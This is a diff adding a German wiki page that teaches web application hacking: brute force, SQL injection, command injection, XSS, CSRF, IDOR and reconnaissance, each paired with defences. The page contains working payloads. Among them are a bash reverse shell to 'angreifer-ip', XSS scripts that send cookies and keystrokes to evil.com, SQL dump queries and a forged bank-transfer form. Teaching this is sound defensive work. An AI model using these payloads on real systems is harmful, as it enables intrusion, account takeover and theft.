@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Hacking – wiki.simonwied.com</title>
+<!-- Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G07DY445N4"></script>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../style.css?v=1.5.2">
+<script src="../../version.js?v=1.5.2"></script>
+<script src="web-hacking.js?v=1.5.2" defer></script>
+<link rel="icon" type="image/svg+xml" href="../../assets/favicon.svg">
+<link rel="icon" type="image/png" sizes="96x96" href="../../assets/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="192x192" href="../../assets/web-app-manifest-192x192.png">
+<link rel="icon" type="image/png" sizes="512x512" href="../../assets/web-app-manifest-512x512.png">
+<link rel="shortcut icon" href="../../assets/favicon.ico">
+<link rel="apple-touch-icon" sizes="180x180" href="../../assets/apple-touch-icon.png">
+<link rel="manifest" href="../../assets/site.webmanifest">
+</head>
+<body>
+
+<div class="layout">
+  <!-- SIDEBAR -->
+  <nav class="sidebar" id="sidebar">
+    <button class="sidebar-toggle" id="sidebarToggle">«</button>
+    <div class="sidebar-logo">
+      <a href="../../index.html"><img src="../../assets/logo_big.png" alt="Wiki." class="logo-img"></a>
+    </div>
+
+    <div class="nav-section">
+      <div class="nav-section-title">Wiki</div>
+      <a href="../../index.html" class="nav-item">
+        <div class="dot" style="background:var(--accent)"></div> ← Startseite
+      </a>
+    </div>
+
+    <div class="nav-section" style="margin-top:4px">
+      <div class="nav-section-title">Auf dieser Seite</div>
+      <a href="#intro" class="nav-item active">
+        <div class="dot" style="background:#00ff88"></div> Einleitung
+      </a>
+      <a href="#auth" class="nav-item">
+        <div class="dot" style="background:#ff4466"></div> Authentication
+      </a>
+      <a href="#injection" class="nav-item">
+        <div class="dot" style="background:#ffaa00"></div> Injection Attacks
+      </a>
+      <a href="#xss" class="nav-item">
+        <div class="dot" style="background:#4488ff"></div> XSS Attacks
+      </a>
+      <a href="#csrf" class="nav-item">
+        <div class="dot" style="background:#aa44ff"></div> CSRF
+      </a>
+      <a href="#idor" class="nav-item">
+        <div class="dot" style="background:#ff8844"></div> IDOR & Access Control
+      </a>
+      <a href="#recon" class="nav-item">
+        <div class="dot" style="background:#44ffcc"></div> Recon & Enumeration
+      </a>
+      <a href="#tools" class="nav-item">
+        <div class="dot" style="background:#ccff44"></div> Tools & Ressourcen
+      </a>
+    </div>
+
+    <div class="sidebar-bottom">
+      <div class="logo-text">wiki.simonwied.com</div>
+    </div>
+  </nav>
+  <div class="sidebar-resize" id="sidebarResize"></div>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="breadcrumb">
+      <a href="../../index.html" class="breadcrumb-link">wiki.simonwied.com</a>
+      <span class="breadcrumb-sep">/</span>
+      <span class="breadcrumb-current">Web Hacking</span>
+    </div>
+    <div class="page-header" id="intro">
+      <span class="page-emoji">⚔️</span>
+      <h1 class="page-title">Web Hacking</h1>
+      <p class="page-subtitle">
+        Eine vollständige Einführung in Web Application Security —<br>
+        Verstehe Angriffe, um Systeme besser zu schützen.
+      </p>
+      <div class="page-meta">
+        <span class="tag green">🟢 Ethical Hacking</span>
+        <span class="tag red">🔴 OWASP Top 10</span>
+        <span class="tag blue">🔵 Lernressource</span>
+        <span class="tag">📅 2025</span>
+      </div>
+    </div>
+
+    <div class="callout">
+      <span class="callout-icon">⚠️</span>
+      <div>
+        <strong>Wichtiger Hinweis:</strong> Diese Seite dient ausschließlich Bildungszwecken im Bereich Cybersecurity. Alle Techniken sollten nur auf eigenen Systemen oder mit ausdrücklicher Genehmigung getestet werden. Unerlaubtes Hacking ist strafbar.
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- ============ CATEGORY 1: AUTHENTICATION ============ -->
+    <div class="category" id="auth">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(255,68,102,0.12);color:#ff4466;border:1px solid rgba(255,68,102,0.3)">🔐 Auth</span>
+        <h2 class="cat-title">Authentication Bypass</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Brute Force -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,68,102,0.1)">🔨</div>
+          <span class="sub-title">Brute-Force Angriff</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Ein Brute-Force-Angriff versucht systematisch alle möglichen Passwort-Kombinationen, bis die richtige gefunden wird. Moderne Tools können tausende Anfragen pro Sekunde senden.
+          </p>
+          <div class="how-it-works">
+            <h4>Wie es funktioniert</h4>
+            <div class="steps">
+              <div class="step"><span class="step-num">01.</span><span>Angreifer sammelt Benutzernamen (z.B. durch Enumeration)</span></div>
+              <div class="step"><span class="step-num">02.</span><span>Tool lädt eine Wortliste (Wordlist) mit häufigen Passwörtern</span></div>
+              <div class="step"><span class="step-num">03.</span><span>Automatisierter Login-Versuch für jedes Passwort</span></div>
+              <div class="step"><span class="step-num">04.</span><span>Bei HTTP 200 / Redirect → Passwort gefunden</span></div>
+            </div>
+          </div>
+          <pre><span class="hl-comment"># Brute-Force auf ein Web-Login mit Hydra</span>
+<span class="hl-func">hydra</span> -l <span class="hl-str">admin</span> -P <span class="hl-str">/usr/share/wordlists/rockyou.txt</span> \
+  <span class="hl-var">targetsite.com</span> http-post-form \
+  <span class="hl-str">"/login:user=^USER^&pass=^PASS^:Invalid credentials"</span>
+
+<span class="hl-comment"># Ergebnis-Beispiel:</span>
+<span class="hl-good">[80][http-post-form] host: targetsite.com</span>
+<span class="hl-good">  login: admin   password: password123</span></pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Rate Limiting (max. 5 Versuche / Minute)</li>
+              <li>Account Lockout nach N fehlgeschlagenen Versuchen</li>
+              <li>CAPTCHA nach mehreren Fehlversuchen</li>
+              <li>Starke Passwort-Policy + MFA aktivieren</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- SQL Injection Login -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,170,0,0.1)">💉</div>
+          <span class="sub-title">SQL Injection (Login Bypass)</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL</span>
+          <p class="sub-desc">
+            Durch manipulierte SQL-Queries kann ein Angreifer den Login-Mechanismus komplett umgehen — ohne ein gültiges Passwort zu kennen.
+          </p>
+          <pre><span class="hl-comment">-- Normale Query des Servers:</span>
+<span class="hl-key">SELECT</span> * <span class="hl-key">FROM</span> users 
+<span class="hl-key">WHERE</span> username = <span class="hl-str">'admin'</span> 
+  <span class="hl-key">AND</span> password = <span class="hl-str">'geheim'</span>;
+
+<span class="hl-comment">-- Eingabe des Angreifers im Username-Feld:</span>
+<span class="hl-danger">admin' OR '1'='1' --</span>
+
+<span class="hl-comment">-- Resultierende Query (Passwort wird ignoriert!):</span>
+<span class="hl-key">SELECT</span> * <span class="hl-key">FROM</span> users 
+<span class="hl-key">WHERE</span> username = <span class="hl-str">'admin'</span> <span class="hl-key">OR</span> <span class="hl-str">'1'</span>=<span class="hl-str">'1'</span> <span class="hl-comment">-- ' AND password='x';</span></pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Prepared Statements / Parameterized Queries verwenden</li>
+              <li>Input-Validierung auf Server-Seite</li>
+              <li>Principle of Least Privilege für DB-User</li>
+              <li>Web Application Firewall (WAF) einsetzen</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- JWT Attacks -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,136,255,0.1)">🎫</div>
+          <span class="sub-title">JWT Token Manipulation</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL</span>
+          <p class="sub-desc">
+            JSON Web Tokens (JWTs) bestehen aus drei Base64-kodierten Teilen: Header, Payload, Signature. Schwachstellen entstehen, wenn der Server die Signatur nicht korrekt prüft.
+          </p>
+          <pre><span class="hl-comment">// Normaler JWT Header:</span>
+{ <span class="hl-str">"alg"</span>: <span class="hl-str">"HS256"</span>, <span class="hl-str">"typ"</span>: <span class="hl-str">"JWT"</span> }
+
+<span class="hl-comment">// Manipulierter Header (None-Algorithmus):</span>
+{ <span class="hl-str">"alg"</span>: <span class="hl-danger">"none"</span>, <span class="hl-str">"typ"</span>: <span class="hl-str">"JWT"</span> }
+
+<span class="hl-comment">// Manipulierter Payload (Rechte erhöhen):</span>
+{
+  <span class="hl-str">"sub"</span>: <span class="hl-str">"user123"</span>,
+  <span class="hl-str">"role"</span>: <span class="hl-danger">"admin"</span>,  <span class="hl-comment">// &lt;-- geändert!</span>
+  <span class="hl-str">"exp"</span>: <span class="hl-num">9999999999</span>
+}</pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Algorithmus "none" explizit ablehnen</li>
+              <li>Signatur auf Server-Seite immer verifizieren</li>
+              <li>Kurze Token-Laufzeiten (exp) verwenden</li>
+              <li>Asymmetrische Algorithmen (RS256) bevorzugen</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CATEGORY 2: INJECTION ============ -->
+    <div class="category" id="injection">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(255,170,0,0.12);color:#ffaa00;border:1px solid rgba(255,170,0,0.3)">💉 Injection</span>
+        <h2 class="cat-title">Injection Attacks</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- SQL Injection Deep Dive -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,170,0,0.1)">🗄️</div>
+          <span class="sub-title">SQL Injection (Daten extrahieren)</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL</span>
+          <p class="sub-desc">
+            Über UNION-basierte oder Blind-SQLi können Angreifer die gesamte Datenbank auslesen: Tabellen, Passwort-Hashes, persönliche Daten — alles.
+          </p>
+          <pre><span class="hl-comment">-- Anzahl Spalten ermitteln (Trial & Error):</span>
+<span class="hl-str">https://shop.de/product?id=1</span> <span class="hl-danger">ORDER BY 3--</span>
+
+<span class="hl-comment">-- Datenbank-Version auslesen:</span>
+<span class="hl-str">?id=1</span> <span class="hl-danger">UNION SELECT 1,version(),3--</span>
+
+<span class="hl-comment">-- Alle Tabellen auflisten:</span>
+<span class="hl-danger">UNION SELECT 1,table_name,3 
+FROM information_schema.tables 
+WHERE table_schema=database()--</span>
+
+<span class="hl-comment">-- Passwörter aus users-Tabelle dumpen:</span>
+<span class="hl-danger">UNION SELECT 1,concat(username,':',password),3 
+FROM users--</span>
+
+<span class="hl-comment">-- Typisches Ergebnis:</span>
+<span class="hl-good">admin:5f4dcc3b5aa765d61d8327deb882cf99</span>  <span class="hl-comment">(MD5 hash)</span></pre>
+          <table class="info-table">
+            <tr><th>SQLi Typ</th><th>Beschreibung</th></tr>
+            <tr><td>Union-based</td><td>Daten direkt in Response einschleusen</td></tr>
+            <tr><td>Error-based</td><td>Fehlermeldungen zur Datenextraktion nutzen</td></tr>
+            <tr><td>Blind (Boolean)</td><td>Ja/Nein-Fragen an die DB stellen</td></tr>
+            <tr><td>Time-based Blind</td><td>Zeitverzögerung (SLEEP) als Signal nutzen</td></tr>
+          </table>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Ausschließlich Prepared Statements verwenden</li>
+              <li>ORM-Frameworks (Hibernate, SQLAlchemy) nutzen</li>
+              <li>Detaillierte Fehlermeldungen in Produktion deaktivieren</li>
+              <li>Datenbank-Benutzer nur mit nötigen Rechten ausstatten</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Command Injection -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,68,102,0.1)">💻</div>
+          <span class="sub-title">Command Injection (OS)</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL</span>
+          <p class="sub-desc">
+            Wenn eine Web-App Benutzereingaben direkt an die System-Shell weitergibt, kann ein Angreifer beliebige Betriebssystem-Befehle ausführen — vollständige Server-Übernahme möglich.
+          </p>
+          <pre><span class="hl-comment">// Verwundbarer PHP-Code:</span>
+<span class="hl-var">$ip</span> = <span class="hl-var">$_GET</span>[<span class="hl-str">'ip'</span>];
+<span class="hl-func">system</span>(<span class="hl-str">"ping -c 1 "</span> . <span class="hl-var">$ip</span>);  <span class="hl-comment">// ← GEFÄHRLICH!</span>
+
+<span class="hl-comment">// Normale Eingabe:</span>
+<span class="hl-str">?ip=8.8.8.8</span>  <span class="hl-comment">→ ping -c 1 8.8.8.8</span>
+
+<span class="hl-comment">// Angriff mit Semikolon (Command Chaining):</span>
+<span class="hl-danger">?ip=8.8.8.8; cat /etc/passwd</span>
+<span class="hl-comment">→ ping -c 1 8.8.8.8; cat /etc/passwd</span>
+
+<span class="hl-comment">// Angriff mit Backtick (Command Substitution):</span>
+<span class="hl-danger">?ip=`whoami`</span>
+
+<span class="hl-comment">// Reverse Shell (komplette Übernahme!):</span>
+<span class="hl-danger">?ip=; bash -i >& /dev/tcp/angreifer-ip/4444 0>&1</span></pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Niemals Benutzereingaben direkt an Shell übergeben</li>
+              <li>escapeshellarg() / escapeshellcmd() in PHP verwenden</li>
+              <li>Whitelist-Validierung (nur IP-Format erlauben)</li>
+              <li>Systembefehle durch sichere API-Aufrufe ersetzen</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- LDAP Injection -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,136,255,0.1)">📁</div>
+          <span class="sub-title">LDAP Injection</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Ähnlich wie SQL Injection, aber gegen LDAP-Verzeichnisdienste (Active Directory). Angreifer können Authentication bypassen oder alle Benutzer aus dem Verzeichnis auslesen.
+          </p>
+          <pre><span class="hl-comment">// Normale LDAP-Query:</span>
+(&(uid=<span class="hl-str">admin</span>)(password=<span class="hl-str">geheim</span>))
+
+<span class="hl-comment">// Angriffs-Eingabe im Username-Feld:</span>
+<span class="hl-danger">admin)(&)</span>
+
+<span class="hl-comment">// Resultierender Filter (immer true!):</span>
+(&(uid=<span class="hl-danger">admin)(&)</span>)(password=x))
+<span class="hl-comment">→ Liest sich als: (uid=admin) AND TRUE</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CATEGORY 3: XSS ============ -->
+    <div class="category" id="xss">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(68,136,255,0.12);color:#4488ff;border:1px solid rgba(68,136,255,0.3)">🕷️ XSS</span>
+        <h2 class="cat-title">Cross-Site Scripting (XSS)</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Reflected XSS -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,136,255,0.1)">↩️</div>
+          <span class="sub-title">Reflected XSS</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Das injizierte Script wird nicht gespeichert, sondern direkt in der HTTP-Response "zurückgespiegelt". Funktioniert über manipulierte Links, die Opfer anklicken sollen.
+          </p>
+          <pre><span class="hl-comment">&lt;!-- Suchfunktion gibt Eingabe zurück: --&gt;</span>
+Suchergebnis für: <span class="hl-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+
+<span class="hl-comment">&lt;!-- Angreifer sendet Link an Opfer: --&gt;</span>
+<span class="hl-str">https://shop.de/search?q=</span><span class="hl-danger">&lt;script&gt;
+  document.location='https://evil.com/steal?c='+document.cookie
+&lt;/script&gt;</span>
+
+<span class="hl-comment">&lt;!-- Modernere Payloads (Filter umgehen): --&gt;</span>
+<span class="hl-danger">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="hl-danger">&lt;svg onload=alert(document.domain)&gt;</span>
+<span class="hl-danger">&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;</span></pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Output-Encoding: HTML-Sonderzeichen escapen (&lt; &gt; " ')</li>
+              <li>Content Security Policy (CSP) Header setzen</li>
+              <li>HttpOnly-Flag auf Cookies setzen</li>
+              <li>Moderne Frameworks (React, Vue) escapen automatisch</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Stored XSS -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,68,102,0.1)">💾</div>
+          <span class="sub-title">Stored XSS (Persistent)</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL</span>
+          <p class="sub-desc">
+            Das Schadscript wird in der Datenbank gespeichert und bei jedem Seitenaufruf ausgeführt — ohne dass ein Opfer einen speziellen Link anklicken muss. Gefährlichste XSS-Variante.
+          </p>
+          <pre><span class="hl-comment">// Angreifer postet in einem Kommentarfeld:</span>
+<span class="hl-danger">&lt;script&gt;
+  fetch(<span class="hl-str">'https://evil.com/log?data='</span> + 
+    encodeURIComponent(document.cookie))
+&lt;/script&gt;</span>
+
+<span class="hl-comment">// Gespeicherter Session-Hijack:</span>
+<span class="hl-danger">&lt;script&gt;
+  var img = new Image();
+  img.src = <span class="hl-str">'https://evil.com/?c='</span> + btoa(document.cookie);
+&lt;/script&gt;</span>
+
+<span class="hl-comment">// Keylogger via XSS:</span>
+<span class="hl-danger">&lt;script&gt;
+  document.onkeypress = e =&gt;
+    fetch(<span class="hl-str">'https://evil.com/key?k='</span> + e.key);
+&lt;/script&gt;</span></pre>
+        </div>
+      </div>
+
+      <!-- DOM XSS -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(170,68,255,0.1)">🌐</div>
+          <span class="sub-title">DOM-based XSS</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Tritt auf, wenn JavaScript unsicher auf DOM-Quellen zugreift (window.location, document.referrer) und diese in unsichere Sinks schreibt (innerHTML, eval). Kein Server involviert.
+          </p>
+          <pre><span class="hl-comment">// Source → Sink Pattern (GEFÄHRLICH):</span>
+<span class="hl-key">var</span> <span class="hl-var">name</span> = <span class="hl-key">new</span> <span class="hl-func">URLSearchParams</span>(location.search).get(<span class="hl-str">'name'</span>);
+document.getElementById(<span class="hl-str">'welcome'</span>).innerHTML = <span class="hl-str">"Hallo, "</span> + <span class="hl-var">name</span>;
+<span class="hl-comment">// URL: ?name=&lt;img src=x onerror=alert(1)&gt;</span>
+
+<span class="hl-comment">// Sichere Alternative:</span>
+document.getElementById(<span class="hl-str">'welcome'</span>).<span class="hl-good">textContent</span> = <span class="hl-str">"Hallo, "</span> + <span class="hl-var">name</span>;</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CATEGORY 4: CSRF ============ -->
+    <div class="category" id="csrf">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(170,68,255,0.12);color:#aa44ff;border:1px solid rgba(170,68,255,0.3)">🎭 CSRF</span>
+        <h2 class="cat-title">Cross-Site Request Forgery</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(170,68,255,0.1)">🎭</div>
+          <span class="sub-title">CSRF Angriff</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Ein Opfer, das bei einer Bank eingeloggt ist, besucht eine bösartige Seite. Diese Seite sendet im Hintergrund eine Überweisung im Namen des Opfers — der Browser fügt automatisch die Session-Cookies hinzu.
+          </p>
+          <pre><span class="hl-comment">&lt;!-- Auf evil.com eingebettetes Formular: --&gt;</span>
+<span class="hl-danger">&lt;img src="https://bank.de/transfer?to=angreifer&amount=5000"&gt;</span>
+
+<span class="hl-comment">&lt;!-- POST-basierter CSRF: --&gt;</span>
+<span class="hl-danger">&lt;form action="https://bank.de/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="angreifer"&gt;
+  &lt;input type="hidden" name="amount" value="5000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</span></pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>CSRF-Tokens (zufällige, nicht vorhersagbare Werte) pro Request</li>
+              <li>SameSite Cookie-Attribut (Lax oder Strict)</li>
+              <li>Origin/Referer-Header auf Server validieren</li>
+              <li>Custom Request Header für AJAX (z.B. X-Requested-With)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CATEGORY 5: IDOR ============ -->
+    <div class="category" id="idor">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(255,136,68,0.12);color:#ff8844;border:1px solid rgba(255,136,68,0.3)">🔓 AccessCtrl</span>
+        <h2 class="cat-title">IDOR & Access Control</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- IDOR -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,136,68,0.1)">📂</div>
+          <span class="sub-title">IDOR (Insecure Direct Object Reference)</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● HIGH</span>
+          <p class="sub-desc">
+            Wenn eine Anwendung interne Objekte (Datei-IDs, User-IDs) direkt über URLs/Parameter exponiert, ohne zu prüfen ob der Benutzer berechtigt ist — kann ein Angreifer einfach die ID ändern.
+          </p>
+          <pre><span class="hl-comment"># Eigenes Profil abrufen:</span>
+GET /api/users/<span class="hl-str">1337</span>/profile  → HTTP 200 (eigene Daten)
+
+<span class="hl-comment"># ID auf anderen User ändern (IDOR!):</span>
+GET /api/users/<span class="hl-danger">1338</span>/profile  → HTTP 200 (fremde Daten! 🚨)
+
+<span class="hl-comment"># Vertrauliches Dokument:</span>
+GET /invoices/<span class="hl-str">INV-2024-001.pdf</span>  → eigene Rechnung
+GET /invoices/<span class="hl-danger">INV-2024-002.pdf</span>  → fremde Rechnung! 🚨
+
+<span class="hl-comment"># Massenhaftes IDOR (Scripted):</span>
+<span class="hl-func">for</span> i in $(seq 1000 2000); do
+  curl -s <span class="hl-str">"https://api.site.com/data/$i"</span> >> output.txt
+done</pre>
+          <div class="defense-block">
+            <h4>🛡️ Schutzmaßnahmen</h4>
+            <ul>
+              <li>Server-seitige Autorisierungsprüfung bei JEDEM Request</li>
+              <li>Indirekte Objekt-Referenzen (GUIDs statt sequenziellen IDs)</li>
+              <li>Zugriffs-Logs auf ungewöhnliche Muster monitoren</li>
+              <li>User-ID aus Session lesen, nicht aus Request-Parameter</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Privilege Escalation -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(255,68,102,0.1)">⬆️</div>
+          <span class="sub-title">Privilege Escalation</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-critical">● CRITICAL</span>
+          <p class="sub-desc">
+            Ein normaler Benutzer versucht Admin-Funktionen zu erreichen, indem er Parameter manipuliert, Headers ändert oder Mass Assignment Schwachstellen ausnutzt.
+          </p>
+          <pre><span class="hl-comment"># Normales Profil-Update (POST):</span>
+{
+  "name": "Max Mustermann",
+  "email": "max@example.com"
+}
+
+<span class="hl-comment"># Angreifer fügt role-Feld hinzu (Mass Assignment):</span>
+{
+  "name": "Max Mustermann",
+  "email": "max@example.com",
+  <span class="hl-danger">"role": "admin",</span>
+  <span class="hl-danger">"is_admin": true</span>
+}</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CATEGORY 6: RECON ============ -->
+    <div class="category" id="recon">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(68,255,204,0.12);color:#44ffcc;border:1px solid rgba(68,255,204,0.3)">🔍 Recon</span>
+        <h2 class="cat-title">Reconnaissance & Enumeration</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <!-- Subdomain Enum -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,255,204,0.08)">🌐</div>
+          <span class="sub-title">Subdomain Enumeration</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● MEDIUM</span>
+          <p class="sub-desc">
+            Das Aufspüren aller Subdomains einer Ziel-Domain. Subdomains können vergessene Test-Systeme, Admin-Panels oder verwundbare alte Versionen sein.
+          </p>
+          <pre><span class="hl-comment"># amass - umfassende Subdomain-Suche</span>
+<span class="hl-func">amass</span> enum -d example.com -passive
+
+<span class="hl-comment"># subfinder - schnelles passive Enumeration</span>
+<span class="hl-func">subfinder</span> -d example.com -all -o subdomains.txt
+
+<span class="hl-comment"># ffuf - DNS Brute Force mit Wordlist</span>
+<span class="hl-func">ffuf</span> -w /usr/share/wordlists/subdomains.txt \
+  -u https://<span class="hl-var">FUZZ</span>.example.com \
+  -mc 200,301,302
+
+<span class="hl-comment"># httpx - Live-Subdomains filtern</span>
+<span class="hl-func">cat</span> subdomains.txt | <span class="hl-func">httpx</span> -title -status-code</pre>
+        </div>
+      </div>
+
+      <!-- Directory Fuzzing -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(68,136,255,0.1)">📁</div>
+          <span class="sub-title">Directory & File Fuzzing</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-medium">● MEDIUM</span>
+          <p class="sub-desc">
+            Versteckte Verzeichnisse und Dateien finden: Admin-Panels, Backup-Dateien (.bak), Konfigurationsdateien, Git-Repositories und mehr.
+          </p>
+          <pre><span class="hl-comment"># ffuf - der schnellste Fuzzer</span>
+<span class="hl-func">ffuf</span> -w /usr/share/wordlists/dirb/common.txt \
+  -u https://example.com/<span class="hl-var">FUZZ</span> \
+  -mc 200,204,301,302 -v
+
+<span class="hl-comment"># Interessante Pfade die man sucht:</span>
+/admin          → Admin-Panel
+/.git           → Git-Repository (Quellcode!)
+/backup         → Backup-Dateien
+/api/v1         → API Endpunkte
+/.env           → Umgebungsvariablen mit Secrets!
+/phpinfo.php    → PHP Konfiguration
+/robots.txt     → Hinweise auf versteckte Pfade</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CATEGORY 7: TOOLS ============ -->
+    <div class="category" id="tools">
+      <div class="category-header">
+        <span class="category-badge" style="background:rgba(204,255,68,0.12);color:#ccff44;border:1px solid rgba(204,255,68,0.3)">🧰 Tools</span>
+        <h2 class="cat-title">Tools & Lernressourcen</h2>
+        <div class="cat-line"></div>
+      </div>
+
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(204,255,68,0.08)">🧰</div>
+          <span class="sub-title">Essential Security Tools</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <table class="info-table">
+            <tr><th>Tool</th><th>Kategorie</th><th>Verwendung</th></tr>
+            <tr><td style="color:#4488ff;font-family:'JetBrains Mono',monospace">Burp Suite</td><td>Proxy / Scanner</td><td>HTTP-Traffic abfangen, modifizieren & analysieren</td></tr>
+            <tr><td style="color:#ffaa00;font-family:'JetBrains Mono',monospace">sqlmap</td><td>SQL Injection</td><td>Automatische SQLi-Erkennung und Exploitation</td></tr>
+            <tr><td style="color:#ff4466;font-family:'JetBrains Mono',monospace">Hydra</td><td>Brute Force</td><td>Login-Brute-Force für HTTP, SSH, FTP, etc.</td></tr>
+            <tr><td style="color:#00ff88;font-family:'JetBrains Mono',monospace">Nmap</td><td>Recon/Scanning</td><td>Port-Scanner, Service-Erkennung</td></tr>
+            <tr><td style="color:#44ffcc;font-family:'JetBrains Mono',monospace">ffuf</td><td>Fuzzing</td><td>Web-Fuzzer für Directories, Parameter, Headers</td></tr>
+            <tr><td style="color:#aa44ff;font-family:'JetBrains Mono',monospace">Nikto</td><td>Vulnerability Scanner</td><td>Web-Server auf bekannte Schwachstellen scannen</td></tr>
+            <tr><td style="color:#ccff44;font-family:'JetBrains Mono',monospace">Amass</td><td>Recon</td><td>Subdomain-Enumeration und Attack Surface Mapping</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(0,255,136,0.08)">📚</div>
+          <span class="sub-title">Lernplattformen & Übungsumgebungen</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <table class="info-table">
+            <tr><th>Plattform</th><th>Typ</th><th>Beschreibung</th></tr>
